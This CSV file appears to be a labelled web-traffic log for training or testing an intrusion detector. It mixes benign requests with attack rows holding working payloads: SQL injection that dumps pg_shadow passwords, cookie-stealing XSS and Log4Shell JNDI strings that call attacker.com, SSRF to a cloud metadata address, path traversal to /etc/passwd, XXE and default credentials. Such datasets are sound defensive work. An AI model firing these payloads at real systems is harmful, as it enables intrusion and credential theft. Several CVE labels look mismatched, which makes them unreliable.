timestamp,attack_type,cve,cvss_score,severity,payload_snippet,label,status_code
2026-05-21T12:15:04.883748,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:04.947571,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:05.041193,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:07.046116,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:07.121058,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:07.215162,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:07.311747,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:09.223527,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:09.280541,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:09.404974,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:09.483073,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:11.496443,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:11.557880,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:11.619824,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:11.682453,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:13.723647,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:13.819503,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:13.879877,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:13.940440,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:15.882312,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:15.957293,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:16.036412,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:16.111528,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:18.046945,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:18.108680,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:18.168217,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:18.247242,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:20.165788,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:20.243423,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:20.306514,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:20.416265,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:15:22.485158,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:15:25.508351,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:15:28.443221,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:15:31.244910,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:15:33.697740,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:15:49.947163,sqli,CVE-2021-32745,8.8,HIGH,1; WAITFOR DELAY '0:0:5'--,1,N/A
2026-05-21T12:15:54.387616,sqli,CVE-2012-3153,7.5,HIGH,' OR 'x'='x,1,N/A
2026-05-21T12:15:59.217858,sqli,CVE-2012-3153,7.5,HIGH,"' UNION SELECT NULL,NULL,NULL FROM dual--",1,N/A
2026-05-21T12:16:01.656570,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:16:04.267692,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:16:06.918786,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:16:09.912412,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:16:12.756147,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:16:15.556737,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:16:18.099264,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:16:20.974014,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:16:26.784638,xss,CVE-2021-26855,9.8,CRITICAL,<script>fetch('https://attacker.com/?c='+document.cookie)</script>,1,N/A
2026-05-21T12:16:31.426042,xss,CVE-2019-11358,6.1,MEDIUM,<script>Object.prototype.nodeName='SCRIPT'</script>,1,N/A
2026-05-21T12:16:33.660238,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:16:36.448809,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:16:39.053838,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:16:41.510451,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:16:43.913100,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:16:46.487567,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:16:49.525439,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:16:51.962229,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:16:58.126510,ssrf,CVE-2021-22986,9.8,CRITICAL,http://127.0.0.1:8080/manager/html,1,N/A
2026-05-21T12:17:02.618814,ssrf,CVE-2021-22986,9.8,CRITICAL,http://100.100.100.200/latest/meta-data/,1,N/A
2026-05-21T12:17:06.756694,ssrf,CVE-2021-22986,9.8,CRITICAL,http://127.0.0.1:8080/manager/html,1,N/A
2026-05-21T12:17:09.190207,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:17:11.926451,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:17:14.576554,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:17:17.034006,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:17:19.596493,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:17:22.617167,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:17:28.671878,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:dns://attacker.com},1,N/A
2026-05-21T12:17:33.312687,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:rmi://attacker.com/payload},1,N/A
2026-05-21T12:17:37.822888,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:ldaps://evil.com:1389/Exploit},1,N/A
2026-05-21T12:17:40.539384,log4shell,CVE-2021-45046,9.0,CRITICAL,${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.com/poc},1,N/A
2026-05-21T12:17:42.880844,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:17:45.218323,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:17:47.515672,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:17:49.793385,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:17:52.990012,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:17:55.781442,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:17:58.360479,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:18:00.804685,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:18:19.103144,brute_force,CVE-2019-1040,5.9,HIGH,support:123456,1,N/A
2026-05-21T12:18:21.680040,brute_force,CVE-2019-1040,5.9,HIGH,support:123456,1,N/A
2026-05-21T12:18:24.346937,brute_force,CVE-2019-1040,5.9,HIGH,admin:12345678,1,N/A
2026-05-21T12:18:26.976324,brute_force,CVE-2019-1040,5.9,HIGH,administrator:admin123,1,N/A
2026-05-21T12:18:32.554366,brute_force,CVE-2019-1040,5.9,HIGH,root:qwerty,1,N/A
2026-05-21T12:18:34.835844,brute_force,CVE-2019-1040,5.9,HIGH,support:letmein,1,N/A
2026-05-21T12:18:37.188218,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:18:39.930385,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:18:42.578903,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:18:46.147722,path_traversal,CVE-2021-41773,9.8,CRITICAL,/..%2F..%2F..%2Fetc%2Fpasswd,1,N/A
2026-05-21T12:18:46.506072,path_traversal,CVE-2019-18935,9.8,CRITICAL,..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,1,N/A
2026-05-21T12:18:48.878517,path_traversal,CVE-2021-41773,9.8,CRITICAL,/static/../../../etc/hosts,1,N/A
2026-05-21T12:18:51.114008,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:18:53.884530,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:18:56.786858,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:19:00.715001,xxe,CVE-2021-27065,7.8,HIGH,<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd,1,201
2026-05-21T12:19:03.033785,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:19:05.670804,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:19:08.415733,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:19:11.431377,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:19:15.527046,csrf,OWASP-A01,6.5,MEDIUM,"{""name"": ""Victim"", ""email"": ""victim713@mail.com"", ""amount"": 3924, ""action"": ""tra",1,201
2026-05-21T12:19:17.971012,csrf,OWASP-A01,6.5,MEDIUM,"{""name"": ""Victim"", ""email"": ""victim381@mail.com"", ""amount"": 4838, ""action"": ""tra",1,201
2026-05-21T12:19:20.601723,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:19:23.279889,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:19:25.840201,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:19:28.178751,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:19:31.215122,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:19:33.918216,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:19:36.753125,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:19:39.174381,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:19:45.371497,sqli,CVE-2021-32745,8.8,HIGH,1; WAITFOR DELAY '0:0:5'--,1,N/A
2026-05-21T12:19:49.460078,sqli,CVE-2021-32745,8.8,HIGH,'; SELECT pg_sleep(5)--,1,N/A
2026-05-21T12:19:53.256165,sqli,CVE-2019-9193,9.8,CRITICAL,"' UNION SELECT username,password,3 FROM pg_shadow--",1,N/A
2026-05-21T12:19:57.258843,sqli,CVE-2021-32745,8.8,HIGH,'; SELECT pg_sleep(5)--,1,N/A
2026-05-21T12:19:59.457816,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:20:02.243384,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:20:04.925416,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:20:07.817837,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:20:10.152079,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:20:13.131375,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:20:15.914959,benign,N/A,0,NONE,normal_orders,0,N/A
